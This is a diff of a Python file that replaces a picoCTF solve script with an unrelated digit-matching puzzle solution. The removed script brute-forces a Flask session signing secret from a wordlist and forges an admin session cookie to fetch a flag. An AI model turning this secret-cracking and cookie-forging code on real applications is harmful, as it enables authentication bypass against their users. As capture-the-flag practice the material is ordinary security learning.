@@ -1,60 +1,28 @@
-import requests
-import re
-import hashlib
-from flask.json.tag import TaggedJSONSerializer
-from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
+from collections import Counter
 
-cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+def solution(X, Y):
+    a = sorted((Counter(X) & Counter(Y)).items(), key=lambda x: (-int(x[0]), -int(x[1])))
+    res = ""
+    for num, count in a:
+        res += num * int(count)
 
-def get_cookie(cookie_name):
-    session = requests.Session()
-    r = session.post('http://mercury.picoctf.net:44693/search', data={'name': cookie_name})
+    if res == "":
+        return "-1"
 
-    return r.headers["Set-Cookie"].split("; ")[0]
+    if len(res) == res.count("0"):
+        return "0"
 
-def get_secret(cookie):
-    for cookie_name in cookie_names:
-        try:
-            serializer = URLSafeTimedSerializer(
-                secret_key=cookie_name,
-                salt='cookie-session',
-                serializer=TaggedJSONSerializer(),
-                signer=TimestampSigner,
-                signer_kwargs={
-                    'key_derivation': 'hmac',
-                    'digest_method': hashlib.sha1
-                }).loads(cookie.split("=")[1])
-        except BadSignature:
-            continue
+    return res
 
-        return cookie_name
+x = "100"
+y = "2345"
 
-def make_admin_cookie(secret):
-    return (URLSafeTimedSerializer(
-        secret_key=secret,
-        salt='cookie-session',
-        serializer=TaggedJSONSerializer(),
-        signer=TimestampSigner,
-        signer_kwargs={
-            'key_derivation': 'hmac',
-            'digest_method': hashlib.sha1
-        }
-    ).dumps({'very_auth' : 'admin'}))
+x = "100"
+y = "203045"
 
-def get_flag(cookie):
-    session = requests.Session()
-    r = session.get('http://mercury.picoctf.net:44693/display', headers={'Cookie': f"session={cookie}"})
+# x = "5525"
+# y = "1255"
 
-    return re.findall("picoCTF{[a-zA-Z0-9_]+}", r.text)
+res = solution(x, y)
 
-
-if __name__ == "__main__":
-    cookie = get_cookie(cookie_names[0])
-
-    secret = get_secret(cookie)
-    print("real secret", secret)
-
-    admin_cookie = make_admin_cookie(secret)
-
-    flags = get_flag(admin_cookie)
-    print("flags", flags[0])
+print('res', res)
